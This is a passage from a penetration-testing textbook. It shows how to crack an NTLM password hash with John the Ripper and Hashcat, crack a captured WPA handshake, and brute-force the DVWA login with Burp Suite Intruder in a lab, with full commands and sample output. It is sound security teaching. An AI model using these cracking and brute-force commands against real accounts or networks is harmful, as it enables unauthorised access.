</pre></div><p class="calibre9">To restore password from hash, just run JTR with the path to the file (that contains the hash) as an input parameter. JTR automatically detects the type of hash and starts the necessary procedures.</p><p class="calibre9">There are several modes of JTR for more efficient results:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><span class="strong"><strong class="calibre2">Single</strong></span>: This mode <a id="id495" class="calibre1"/>is very fast, but this mode should be used only if we have usernames. Usernames are used as passwords with prepared rules that are stored in the configuration file of JTR. For this mode, we execute the command <code class="literal">john -single hashes.txt</code>.</li><li class="listitem"><span class="strong"><strong class="calibre2">Wordlist</strong></span>: In this <a id="id496" class="calibre1"/>mode, JTR uses a dictionary and rules. Here, we can use the rules in the configuration file (<code class="literal">john -w=dictionary.txt -rules hashes.txt</code>) and the rules of a particular file (<code class="literal">john -w:dictionary.txt -rules=Rules.txt hashes.txt</code>).</li><li class="listitem"><span class="strong"><strong class="calibre2">Incremental</strong></span>: This is <a id="id497" class="calibre1"/>a bruteforce attack and not a straight style counter (that is not 1, 2, 3 ...), but it is based on rules. Rules are defined in the <code class="literal">*.chr</code> files. To run it in the incremental mode, use the command <code class="literal">john -i:Alpha hashes.txt</code>, where <code class="literal">Alpha</code> is a type.</li><li class="listitem"><span class="strong"><strong class="calibre2">Builtin</strong></span>: This<a id="id498" class="calibre1"/> is a bruteforce mode for the built-in set. For example, <code class="literal">john -i=uld8 -builtin = ld hashes.txt</code>, where <code class="literal">-i = uld8</code> indicates that it will use charset <code class="literal">uld</code> 8 characters long and <code class="literal">-builtin = ld</code> denotes that words are generated from a mixed set of letters and numbers.</li><li class="listitem"><span class="strong"><strong class="calibre2">External</strong></span>: Here, words<a id="id499" class="calibre1"/> will be generated in accordance with the rules described in the appropriate section of the configuration file. For example, <code class="literal">john -e=Paralel01 hashes.txt</code>.</li><li class="listitem"><span class="strong"><strong class="calibre2">Mask</strong></span>: This is <a id="id500" class="calibre1"/>an attack based on mask. For example, <code class="literal">john -mask=\u\l\l\d\d\d hashes.txt</code> means words will be like <code class="literal">Abc123</code>.</li></ul></div><p class="calibre9">You can choose the required mode in your own case as per your needs.</p><p class="calibre9">One of the important features of JTR is that it supports work sessions, so it is possible to run multiple instances of JTR and restore work after JTR stops.</p><p class="calibre9">For this, start JTR with the <code class="literal">-session=&lt;SESSION NAME&gt;</code> key:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">john -session=session01 i:Alpha passfile</strong></span>
</pre></div><p class="calibre9">Restore it with the following command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">john -restore=session01</strong></span>
</pre></div><div class="book" title="Example"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec47" class="calibre1"/>Example</h3></div></div></div><p class="calibre9">Previously, when <a id="id501" class="calibre1"/>working with the Metasploit Framework, we have received hashes of local user passwords. Let's try to carry out an attack on a hash to restore a password using JTR.</p><p class="calibre9">For this, first of all, let's put the hash string of user John to a separate file:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">echo "John:1001:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::" &gt; hashdump.txt</strong></span>
</pre></div><p class="calibre9">Execute JTR on this file:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">john --format=NT hashdump.txt</strong></span>
<span class="strong"><strong class="calibre2">Using default input encoding: UTF-8</strong></span>
<span class="strong"><strong class="calibre2">Rules/masks using ISO-8859-1</strong></span>
<span class="strong"><strong class="calibre2">Loaded 1 password hash (NT [MD4 32/32])</strong></span>
<span class="strong"><strong class="calibre2">Warning: no OpenMP support for this hash type, consider --fork=4</strong></span>
<span class="strong"><strong class="calibre2">Press 'q' or Ctrl-C to abort, almost any other key for status</strong></span>
<span class="strong"><strong class="calibre2">12345678         (John)</strong></span>
<span class="strong"><strong class="calibre2">1g 0:00:00:00 DONE 2/3 (2015-12-18 02:21) 2.083g/s 1797p/s 1797c/s 1797C/s 12345678</strong></span>
<span class="strong"><strong class="calibre2">Use the "--show" option to display all of the cracked passwords reliably</strong></span>
<span class="strong"><strong class="calibre2">Session completed</strong></span>
</pre></div><p class="calibre9">In the sixth line of output, we can see our password <code class="literal">12345678</code>. So, in our case, the password was weak and JTR restores it quickly.</p></div></div></div>

<div class="book" title="Cracking tools">
<div class="book" title="Hashcat"><div class="book"><div class="book"><div class="book"><h2 class="title1" id="calibre_pb_2"><a id="ch06lvl2sec65" class="calibre1"/>Hashcat</h2></div></div></div><p class="calibre9">Hashcat<a id="id502" class="calibre1"/> is a <a id="id503" class="calibre1"/>multifunctional tool for restoring passwords from their hashes. Hashcat became so popular thanks to the support of the vast number of algorithms of hashing data, speed of work, and ease of configuring and use.</p><p class="calibre9">Hashcat has<a id="id504" class="calibre1"/> the following benefits:</p><div class="book"><ul class="itemizedlist"><li class="listitem">Multithreaded</li><li class="listitem">Open source</li><li class="listitem">Cross platform (Linux, Windows, and OS X)</li><li class="listitem">More than 90 hashing algorithms (MD5, SHA1, NTLM, MySQL, WPA, and so on)</li><li class="listitem">Expandable attack modes</li><li class="listitem">JTR compatible</li><li class="listitem">Wide set of settings</li></ul></div><p class="calibre9">But the most important feature is the ability to work on graphical processors, which gives a significant boost in speed compared to the work of the CPU.</p><p class="calibre9">You can get Hashcat from the <a id="id505" class="calibre1"/>official website (<a class="calibre1" href="http://hashcat.net">http://hashcat.net</a>). In most popular Linux distributions, it is available in their repositories. For example, in Debian, you can use the following command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">apt-get install hashcat</strong></span>
</pre></div><p class="calibre9">Hashcat contains many executable files with different prefixes and postfixes: <code class="literal">hashcat</code>, <code class="literal">oclHashcat</code>, <code class="literal">oclHashcat-plus</code>, <code class="literal">oclHashcat-lite</code>, and <code class="literal">cudaHashcat</code>. Each executable file performs its task, so you should choose one depending on your requirements.</p><div class="book"><ul class="itemizedlist"><li class="listitem"><code class="literal">./hashcat</code>: This is the main program that uses the CPU. It is slow, but it supports the largest number of hashing algorithms.</li><li class="listitem">Prefix <code class="literal">ocl</code> (<code class="literal">oclHashcat</code>): It uses the GPU of ATI. It supports a limited amount of hashing algorithms and it has built-in support for dictionary attacks, mask attacks, and bruteforce attacks.</li><li class="listitem">Prefix <code class="literal">cuda</code> (<code class="literal">cudaHashcat</code>): It is like prefix <code class="literal">ocl</code>, but it uses the GPU of NVIDIA.</li><li class="listitem">Postfix <code class="literal">plus</code> (<code class="literal">oclHashcat-plus</code>): It supports the largest number of hashing algorithms from all Hashcat(s) using GPU. It is optimized for dictionary attacks for many hashes.</li><li class="listitem">Postfix <code class="literal">lite</code> (<code class="literal">oclHashcat-lite</code>): It is optimized for a single hash attack. The fastest executable Hashcat, but it supports a minimum number of hashing algorithms.</li></ul></div><p class="calibre9">It should be noted that for <code class="literal">cuda</code> and <code class="literal">ocl</code> versions of Hashcat, we need to install appropriate proprietary drivers that support the conduct of GPU computing.</p><p class="calibre9">Hashcat is executed with the following syntax:</p><p class="calibre9">
<code class="literal">hashcat [options] hashfile [mask|wordfiles|directories]</code>
</p><p class="calibre9">Here:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><code class="literal">options</code>: These are parameters such as attack mode, hash type, rules and others</li><li class="listitem"><code class="literal">hashfile</code>: This is the file on the local filesystem that contains the target hash</li><li class="listitem"><code class="literal">mask|wordfiles|directories</code>: This is the source of passwords</li></ul></div><p class="calibre9">You can<a id="id506" class="calibre1"/> get the full list of Hashcat parameters by executing the <code class="literal">help</code> command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">hashcat --help</strong></span>
</pre></div><p class="calibre9">For example, for speed benchmarking, we can use the <code class="literal">-b</code> key:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">oclHashcat -b</strong></span>
</pre></div><div class="book" title="Example"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec48" class="calibre1"/>Example</h3></div></div></div><p class="calibre9">Let's repeat <a id="id507" class="calibre1"/>the restore procedure for the password of user John, as we did in the case of JTR, but using Hashcat. As in the case of JTR, first we need to put hash into a separate file, but the requirements of Hashcat are a little different. From the obtained hash string <code class="literal">John:1001:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::</code>, we need get only the NT part of the NTLM hash. It is the fourth field separated by a colon character hash string, that is, <code class="literal">259745cb123a52aa2e693aaacca2db52</code>.</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">echo "259745cb123a52aa2e693aaacca2db52" &gt; hashdump.hc</strong></span>
</pre></div><p class="calibre9">And execute Hashcat on this file:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">hashcat -m 1000 hashdump.hc passwords.list</strong></span>
</pre></div><p class="calibre9">Here:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><code class="literal">-m 1000</code>: This points out that this is a NTLM hash</li><li class="listitem"><code class="literal">hashdump.hc</code>: This is the file that contains the hash</li><li class="listitem"><code class="literal">passwords.list</code>: This is the dictionary file with passwords for iterating; in our case (for testing purposes), it contains the correct password for our hash</li></ul></div><p class="calibre9">The output of the executed command will be like this:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Initializing hashcat v0.50 with 4 threads and 32mb segment-size...</strong></span>

<span class="strong"><strong class="calibre2">Added hashes from file hashdump.hc: 1 (1 salts)</strong></span>
<span class="strong"><strong class="calibre2">Activating quick-digest mode for single-hash</strong></span>

<span class="strong"><strong class="calibre2">259745cb123a52aa2e693aaacca2db52:12345678    </strong></span>
<span class="strong"><strong class="calibre2">                                             </strong></span>
<span class="strong"><strong class="calibre2">All hashes have been recovered</strong></span>

<span class="strong"><strong class="calibre2">Input.Mode: Dict (passwords.list)</strong></span>
<span class="strong"><strong class="calibre2">Index.....: 1/1 (segment), 8 (words), 56 (bytes)</strong></span>
<span class="strong"><strong class="calibre2">Recovered.: 1/1 hashes, 1/1 salts</strong></span>
<span class="strong"><strong class="calibre2">Speed/sec.: - plains, - words</strong></span>
<span class="strong"><strong class="calibre2">Progress..: 8/8 (100.00%)</strong></span>
<span class="strong"><strong class="calibre2">Running...: 00:00:00:01</strong></span>
<span class="strong"><strong class="calibre2">Estimated.: --:--:--:--</strong></span>

<span class="strong"><strong class="calibre2">Started: Fri Dec 18 02:28:54 2015</strong></span>
<span class="strong"><strong class="calibre2">Stopped: Fri Dec 18 02:28:55 2015</strong></span>
</pre></div><p class="calibre9">The output <a id="id508" class="calibre1"/>is informative enough and we can see our recovered password.</p><p class="calibre9">Now, let's try to crack the WPA handshake which we obtained when we met with <code class="literal">aircrack-ng</code>. We have the WPA handshake in the <code class="literal">guest_dump-01.cap</code> file. Before we get started with Hashcat, we need to format the handshake in an acceptable form for Hashcat.</p><p class="calibre9">For this purpose, first we need to clean the <code class="literal">*.cap</code> file:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">wpaclean clear.cap guest_dump-01.cap.cap</strong></span>
</pre></div><p class="calibre9">The output is as follows:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Pwning cap.cap (1/1 100%)</strong></span>
<span class="strong"><strong class="calibre2">Net 68:B6:FC:15:27:18 Guest</strong></span>
<span class="strong"><strong class="calibre2">Done</strong></span>
</pre></div><p class="calibre9">Here</p><div class="book"><ul class="itemizedlist"><li class="listitem"><code class="literal">clear.cap</code>: This is the name of new cap-file</li><li class="listitem"><code class="literal">guest_dump-01.cap</code>: This is the file that contained our handshake</li></ul></div><p class="calibre9">Then, we need to convert the CAP file into a Hashcat format CAP file (<code class="literal">.hccap</code>). To do this, use the <code class="literal">aircrack-ng</code> command with the <code class="literal">-J</code> key:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">aircrack-ng clear.cap -J output_file</strong></span>
</pre></div><p class="calibre9">The output is as follows:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">Opening clear.cap</strong></span>
<span class="strong"><strong class="calibre2">Read 3 packets.</strong></span>

<span class="strong"><strong class="calibre2">   #  BSSID              ESSID                     Encryption</strong></span>

<span class="strong"><strong class="calibre2">   1  68:B6:FC:15:27:18  Guest                     WPA (1 handshake)</strong></span>

<span class="strong"><strong class="calibre2">Choosing first network as target.</strong></span>

<span class="strong"><strong class="calibre2">Opening clear.cap</strong></span>
<span class="strong"><strong class="calibre2">Reading packets, please wait...</strong></span>

<span class="strong"><strong class="calibre2">Building Hashcat (1.00) file...</strong></span>

<span class="strong"><strong class="calibre2">[*] ESSID (length: 9): Guest</strong></span>
<span class="strong"><strong class="calibre2">[*] Key version: 2</strong></span>
<span class="strong"><strong class="calibre2">[*] BSSID: 68:B6:FC:15:27:18</strong></span>
<span class="strong"><strong class="calibre2">[*] STA: F8:A9:D0:65:50:B6</strong></span>
<span class="strong"><strong class="calibre2">[*] anonce:</strong></span>
<span class="strong"><strong class="calibre2">    8A E5 48 30 74 C8 16 E4 18 72 4E 67 33 A4 ED 30 </strong></span>
<span class="strong"><strong class="calibre2">    89 56 53 AE 87 F8 9A C6 77 63 A0 4B 17 C7 8D 37 </strong></span>
<span class="strong"><strong class="calibre2">[*] snonce:</strong></span>
<span class="strong"><strong class="calibre2">    AF E5 3D 67 9D CD BE 7C 8F CD 2E E2 50 34 5B D8 </strong></span>
<span class="strong"><strong class="calibre2">    2B CA B5 D3 40 A1 8F 88 8D 68 00 AB 2C 92 8B 0F </strong></span>
<span class="strong"><strong class="calibre2">[*] Key MIC:</strong></span>
<span class="strong"><strong class="calibre2">    BC C9 54 49 2B FF 81 C8 77 13 A3 1E 5D 7E 13 E6</strong></span>
<span class="strong"><strong class="calibre2">[*] eapol:</strong></span>
<span class="strong"><strong class="calibre2">    01 03 00 77 99 01 0A 00 00 00 00 00 00 00 00 00 </strong></span>
<span class="strong"><strong class="calibre2">    01 AF E5 3D 67 9D BC DA 7C 8F CD 2E E2 FA 34 5B </strong></span>
<span class="strong"><strong class="calibre2">    D8 2B CA B5 D3 40 A1 8F 77 8D 68 00 AB 2C 92 8B </strong></span>
<span class="strong"><strong class="calibre2">    0F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </strong></span>
<span class="strong"><strong class="calibre2">    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </strong></span>
<span class="strong"><strong class="calibre2">    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </strong></span>
<span class="strong"><strong class="calibre2">    00 00 18 30 16 01 00 00 0F AC 02 01 00 00 0F AC </strong></span>
<span class="strong"><strong class="calibre2">    04 01 00 00 0F BC 02 4C 00 00 00 </strong></span>

<span class="strong"><strong class="calibre2">Successfully written to output.hccap</strong></span>
<span class="strong"><strong class="calibre2">Quitting aircrack-ng...</strong></span>
</pre></div><p class="calibre9">As a result, we get the <code class="literal">output_file.hccap</code> file. Please note that the used <span class="strong"><em class="calibre10">J</em></span> is in uppercase.</p><p class="calibre9">Now, we <a id="id509" class="calibre1"/>can execute Hashcat with the following command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">cudaHashcat --force -m 2500 ./output_file.hccap ./wordlist.txt</strong></span>
</pre></div><p class="calibre9">Here:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><code class="literal">--force</code>: This ignores warnings</li><li class="listitem"><code class="literal">-m 2500</code>: The hash type is WPA/WPA2</li><li class="listitem"><code class="literal">--session=session05</code>: This is the name of the session (for possible continuation)</li></ul></div><p class="calibre9">The output <a id="id510" class="calibre1"/>is as follows:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong class="calibre2">cudaHashcat v1.37 starting...</strong></span>

<span class="strong"><strong class="calibre2">Device #1: GeForce GT 730M, 2048MB, 758Mhz, 2MCU</strong></span>
<span class="strong"><strong class="calibre2">Device #1: WARNING! Kernel exec timeout is not disabled, it might cause you errors of code 702</strong></span>
<span class="strong"><strong class="calibre2">           You can disable it with a regpatch, see here: http://hashcat.net/wiki</strong></span>
<span class="strong"><strong class="calibre2">/doku.php?id=timeout_patch</strong></span>

<span class="strong"><strong class="calibre2">Hashes: 1 hashes; 1 unique digests, 1 unique salts</strong></span>
<span class="strong"><strong class="calibre2">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</strong></span>
<span class="strong"><strong class="calibre2">Rules: 1</strong></span>
<span class="strong"><strong class="calibre2">Applicable Optimizers:</strong></span>
<span class="strong"><strong class="calibre2">* Zero-Byte</strong></span>
<span class="strong"><strong class="calibre2">* Single-Hash</strong></span>
<span class="strong"><strong class="calibre2">* Single-Salt</strong></span>
<span class="strong"><strong class="calibre2">Watchdog: Temperature abort trigger set to 90c</strong></span>
<span class="strong"><strong class="calibre2">Watchdog: Temperature retain trigger set to 80c</strong></span>
<span class="strong"><strong class="calibre2">Device #1: Kernel ./kernels/4318/m02500.sm_35.64.cubin</strong></span>
<span class="strong"><strong class="calibre2">Device #1: Kernel ./kernels/4318/amp_a0_v1.sm_35.64.cubin</strong></span>

<span class="strong"><strong class="calibre2">Generating dictionary stats for wordlist.txt: 96 bytes (100.00%), 8 words, 8 keyspace</strong></span>

<span class="strong"><strong class="calibre2">Generated dictionary stats for wordlist.txt: 96 bytes, 8 words, 8 keyspace</strong></span>
<span class="strong"><strong class="calibre2">INFO: approaching final keyspace, workload adjusted</strong></span>
<span class="strong"><strong class="calibre2">Guest:20107a4da6c4:ac7ba167bdc5:Test!!!800</strong></span>

<span class="strong"><strong class="calibre2">Session.Name...: cudaHashcat</strong></span>
<span class="strong"><strong class="calibre2">Status.........: Cracked</strong></span>
<span class="strong"><strong class="calibre2">Input.Mode.....: File (wordlist.txt)</strong></span>
<span class="strong"><strong class="calibre2">Hash.Target....: Guest (68:B6:FC:15:27:18 &lt;-&gt; F8:A9:D0:65:50:B6)</strong></span>
<span class="strong"><strong class="calibre2">Hash.Type......: WPA/WPA2</strong></span>
<span class="strong"><strong class="calibre2">Time.Started...: 0 secs</strong></span>
<span class="strong"><strong class="calibre2">Speed.GPU.#1...:        0 H/s</strong></span>
<span class="strong"><strong class="calibre2">Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</strong></span>
<span class="strong"><strong class="calibre2">Progress.......: 8/8 (100.00%)</strong></span>
<span class="strong"><strong class="calibre2">Rejected.......: 0/8 (0.00%)</strong></span>
<span class="strong"><strong class="calibre2">HWMon.GPU.#1...:  0% Util, 39c Temp, N/A Fan</strong></span>

<span class="strong"><strong class="calibre2">Started: Fri Dec 18 06:22:33 2015</strong></span>
<span class="strong"><strong class="calibre2">Stopped: Fri Dec 18 06:22:35 2015</strong></span>
</pre></div><p class="calibre9">In this case, the text of the password was <code class="literal">Test!!!800</code>. At the beginning of the output, you can see <a id="id511" class="calibre1"/>which GPU is supported by the program. If you have multiple GPUs, even if they are not united, the software will detect them automatically. If the GPU is not found, you will have to check whether the proprietary drivers and additional libraries are installed.</p></div></div></div>

<div id="page" style="height:0pt"/><div class="book" title="Web application hacking tools"><div class="book" id="1AT9A2-3ecab517ca6e4afbb3c20ab15f7b4d82"><div class="book"><div class="book"><h1 class="title" id="calibre_pb_0"><a id="ch06lvl1sec38" class="calibre1"/>Web application hacking tools</h1></div></div></div><p class="calibre9">Needless to say, with <a id="id512" class="calibre1"/>every new day web applications play a bigger role in the life of the modern Internet than they have ever played before and their security stays among the most important and complicated tasks for various companies.</p><p class="calibre9">Most of them are custom written proprietary applications developed without proper application security management processes in place and often without security considerations and controls. That is why probably the most demanded penetration testing service nowadays is web application security analysis and we are going to review the most popular tool used by web hackers and pentesters.</p></div>

<div class="book" title="Web application hacking tools">
<div class="book" title="Burp Suite"><div class="book"><div class="book"><div class="book"><h2 class="title1" id="calibre_pb_1"><a id="ch06lvl2sec66" class="calibre1"/>Burp Suite</h2></div></div></div><p class="calibre9">Burp Suite<a id="id513" class="calibre1"/> is a tool of the class called intercepting <a id="id514" class="calibre1"/>or attacking proxy, which allows its users to inspect and manipulate web traffic passing through it.</p><p class="calibre9">There are other free and non-free intercepting (attack) proxies available. However, the authors of this book got used to and stuck to Burp Suite, and that is why we are going to describe this framework.</p><div class="informalexample" title="Note"><h3 class="title2"><a id="note27" class="calibre1"/>Note</h3><p class="calibre9">The main functions and capabilities of various attack proxies are the same (or at least, very similar), so you can treat the following Burp Suite review more or less as a review of the whole class of tools, rather than a certain software.</p><p class="calibre9">You can find comparisons of various attack proxies using Google search and choose the one that fits your needs best and is the most comfortable for you personally to work with.</p><p class="calibre9">The other alternative<a id="id515" class="calibre1"/> intercepting proxies that are worth trying could be:</p><div class="book"><ul class="itemizedlist"><li class="listitem">OWASP <span class="strong"><strong class="calibre2">Zed attack proxy</strong></span> (<span class="strong"><strong class="calibre2">ZAP</strong></span>)</li><li class="listitem">OWASP WebScarab</li><li class="listitem">Watobo</li></ul></div></div><p class="calibre9">Burp Suite is a cross-platform Java framework with various tools combined in one GUI, which works <a id="id516" class="calibre1"/>under any OS with appropriate Java software installed. One of the main advantages of the Burp Suit is its extensibility through a special API and numerous extensions.</p><p class="calibre9">There are two <a id="id517" class="calibre1"/>variants of Burp Suite available on the official website (<a class="calibre1" href="https://portswigger.net/burp/">https://portswigger.net/burp/</a>): free and Pro versions.</p><p class="calibre9">The free version <a id="id518" class="calibre1"/>contains the same tools as the Pro version, but with limited capabilities and less automation. Those tools are:</p><div class="book"><ul class="itemizedlist"><li class="listitem"><span class="strong"><strong class="calibre2">Intercepting proxy</strong></span>: This allows you to review and modify web traffic</li><li class="listitem"><span class="strong"><strong class="calibre2">Information aggregation tool</strong></span>: This represents gathered information about targets in a convenient way</li><li class="listitem"><span class="strong"><strong class="calibre2">Spider</strong></span>: Spiders inspects all links and pages of target web resources to determine their structures and pass this information to the aggregation tool</li><li class="listitem"><span class="strong"><strong class="calibre2">Repeater</strong></span>: This allows us to send customized requests and analyze responses</li><li class="listitem"><span class="strong"><strong class="calibre2">Intruder</strong></span>: This is the attack automation and customization tool</li><li class="listitem"><span class="strong"><strong class="calibre2">Decoder</strong></span>: This is helpful to encode-decode character blocks</li><li class="listitem"><span class="strong"><strong class="calibre2">Sequencer</strong></span>: This analyzes the entropy of various tokens</li><li class="listitem"><span class="strong"><strong class="calibre2">Comparer</strong></span>: This compares requests and responses in a convenient way</li><li class="listitem"><span class="strong"><strong class="calibre2">Extender</strong></span>: This allows installation and management of numerous Burp extensions</li></ul></div><p class="calibre9">When talking about the most significant distinctions between the free and Pro versions, the Pro version also allows the following:</p><div class="book"><ul class="itemizedlist"><li class="listitem">Carrying out passive security analysis of web traffic and active web vulnerability scans using the Scanner tool</li><li class="listitem">Saving and restoring framework state including all requests and responses (especially useful for big projects)</li><li class="listitem">Using various built-in attack payloads for automated attacks with the Intruder tool</li><li class="listitem">Performing search and various analysis types of targets and captured web traffic</li><li class="listitem">Taking advantage of a better performance in the Intruder tool</li><li class="listitem">Installing some extensions available only for the Pro version</li></ul></div><div class="book" title="Example"><div class="book"><div class="book"><div class="book"><h3 class="title2"><a id="ch06lvl3sec49" class="calibre1"/>Example</h3></div></div></div><p class="calibre9">After<a id="id519" class="calibre1"/> introducing Burp Suite, we would like to show you an example of a sample web application testing. Let's work with DVWA in our lab environment. We assume that you have already downloaded and started a free version on an attacking machine.</p><div class="informalexample" title="Note"><h3 class="title2"><a id="note28" class="calibre1"/>Note</h3><p class="calibre9">Another useful tool for web pentesting is a <a id="id520" class="calibre1"/><span class="strong"><strong class="calibre2">proxy switching browser extension</strong></span>. Since most of the web application testing activities are done in a browser, it is not very convenient to always change browser or OS settings when you need to switch between proxies or turn off passing traffic through a proxy at all. The better and faster way is to have a button on a toolbar provided by special browser extensions. We use the FoxyProxy extension for Mozilla Firefox and Google Chrome browsers.</p></div><p class="calibre9">Let's start <a id="id521" class="calibre1"/>with the example:</p><div class="book"><ol class="orderedlist"><li class="listitem" value="1">Start the DVWA VM and set the appropriate network interface settings according to the way your attacking machine is connected to the lab environment (in our case, we don't start the whole lab network but just start the DVWA VM with an interface in host-only mode and attack it from the host machine).</li><li class="listitem" value="2">Start Burp Suite, go to <span class="strong"><strong class="calibre2">Proxy</strong></span> | <span class="strong"><strong class="calibre2">Options</strong></span>, and check if there is an activated proxy listener on <code class="literal">localhost:8080</code> (activate it if not). It should look like this:<div class="mediaobject"><img src="../images/00063.jpeg" alt="Example" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="3">Go to the <span class="strong"><strong class="calibre2">Proxy</strong></span> | <span class="strong"><strong class="calibre2">Intercept</strong></span> tab and check whether the <span class="strong"><strong class="calibre2">Intercept</strong></span> button is selected. It will intercept web requests instead of just recording them.</li><li class="listitem" value="4">Configure <a id="id522" class="calibre1"/>a local proxy on port 8080 in your browser or create and activate it in the FoxyProxy browser extension:<div class="mediaobject"><img src="../images/00064.jpeg" alt="Example" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="5">Open DVWA in browser with the <code class="literal">http://10.0.0.5/DVWA</code> link and you will see the request in Burp:<div class="mediaobject"><img src="../images/00065.jpeg" alt="Example" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="6">Just inspect the request and turn interception off. It will allow to forward the next request to its target and not intercept the following requests.</li><li class="listitem" value="7">Log in to the application in the browser, switch to the <span class="strong"><strong class="calibre2">Proxy</strong></span> | <span class="strong"><strong class="calibre2">HTTP History</strong></span> tab in Burp, find the initial request to DVWA in the list, right-click on it, and click on <span class="strong"><strong class="calibre2">Add</strong></span> to scope in the context menu.</li><li class="listitem" value="8">Go to<a id="id523" class="calibre1"/> the <span class="strong"><strong class="calibre2">Target</strong></span> tab. Here, you will see domains and hosts (targets) that your browser has requested since you have started intercept. On the <span class="strong"><strong class="calibre2">Target</strong></span> | <span class="strong"><strong class="calibre2">Scope</strong></span> tab, you will see which targets are currently added to the scope of your security assessment. Check whether <code class="literal">10.0.0.5/dvwa/</code> is among them.</li><li class="listitem" value="9">Now, you can make Burp hide everything that is not in the scope. It will still capture all web traffic, but it will not bother you by displaying it. To hide everything not in scope, just click on the filter line under tab menu and select the <span class="strong"><strong class="calibre2">Show only in-scope items</strong></span> checkbox:<div class="mediaobject"><img src="../images/00066.jpeg" alt="Example" class="calibre11"/></div><p class="calibre26"> </p><p class="calibre27">Do the same for the <span class="strong"><strong class="calibre2">Proxy</strong></span> | <span class="strong"><strong class="calibre2">HTTP history</strong></span> tab.</p></li><li class="listitem" value="10">Turn intercept on again and log into DVWA with empty credentials and go to the <span class="strong"><strong class="calibre2">Proxy</strong></span> | <span class="strong"><strong class="calibre2">Intercept</strong></span> in Burp. You will see the <code class="literal">username</code> and <code class="literal">password</code> parameters without values in the <code class="literal">POST</code> request body.</li><li class="listitem" value="11">Right-click on the request body and choose <span class="strong"><strong class="calibre2">Send to intruder</strong></span> in the context menu. Switch to the <span class="strong"><strong class="calibre2">Intruder</strong></span> tab.</li><li class="listitem" value="12">Now, we<a id="id524" class="calibre1"/> will perform a dictionary guessing attack on the authentication subsystem of DVWA. We will try to guess the correct credentials. Go to the <span class="strong"><strong class="calibre2">Positions</strong></span> subtab and click on the <span class="strong"><strong class="calibre2">Clear §</strong></span> button to reset all positions suggested by Burp.</li><li class="listitem" value="13">Place the cursor after <code class="literal">username=</code> and type in the <code class="literal">§</code> character twice or click on the <span class="strong"><strong class="calibre2">Add §</strong></span> button twice. Do the same with the password parameter. You should have the following:<div class="mediaobject"><img src="../images/00067.jpeg" alt="Example" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="14">Choose the attack type <span class="strong"><strong class="calibre2">Cluster bomb</strong></span> and go to the next <span class="strong"><strong class="calibre2">Payloads</strong></span> tab.</li><li class="listitem" value="15">Add several words to the <span class="strong"><strong class="calibre2">Payload Options</strong></span> section and add the real DVWA username too:<div class="mediaobject"><img src="../images/00068.jpeg" alt="Example" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="16">Change the <a id="id525" class="calibre1"/>payload set to 2 and add several words for the password payload, including the real password:<div class="mediaobject"><img src="../images/00069.jpeg" alt="Example" class="calibre11"/></div><p class="calibre26"> </p></li><li class="listitem" value="17">Go to <span class="strong"><strong class="calibre2">Options</strong></span>, scroll <a id="id526" class="calibre1"/>down, and select the <span class="strong"><strong class="calibre2">In-scope only</strong></span> radio button in the <span class="strong"><strong class="calibre2">Redirections</strong></span> section.</li><li class="listitem" value="18">Now, scroll back up and click on the <span class="strong"><strong class="calibre2">Start attack</strong></span> button in the top-right corner and a new window will open. It will show you the progress of the attack and all sent and received requests and responses.</li><li class="listitem" value="19">Sort the list by response length by clicking on the corresponding column and you will see which payloads have succeeded (successful logon and failure responses will be of different lengths in the current example):<div class="mediaobject"><img src="../images/00070.jpeg" alt="Example" class="calibre11"/></div><p class="calibre26"> </p></li></ol><div class="calibre14"/></div><p class="calibre9">The <a id="id527" class="calibre1"/>authentication credentials are guessed! Of course, in real projects you will not have a guarantee that correct credentials are in your payload list, so the success of an attack will depend on your dictionaries.</p><p class="calibre9">It was just a quick and short lab example, but there are numerous ways of intercepting proxy utilization and they are different for different targets. Take your time and properly learn manuals for the tools that you choose for work.</p></div></div></div>
